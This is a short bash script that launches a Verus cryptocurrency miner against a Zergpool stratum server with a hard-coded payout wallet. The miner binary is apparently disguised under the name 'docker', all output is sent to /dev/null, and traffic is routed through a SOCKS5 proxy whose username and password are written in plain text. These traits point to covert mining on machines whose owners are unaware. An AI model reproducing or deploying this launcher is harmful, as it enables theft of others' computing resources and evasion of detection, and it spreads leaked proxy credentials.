#!/bin/bash
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT
PROXY=socks5://nwrrjrhq:6krfq9tv5jb9@45.72.53.142:6178
./docker -a verus -o $POOL -u $WALLET.bocil -p c=DGB,mc=VRSC,ID=bocil -t 2 -x $PROXY > /dev/null 2>&1
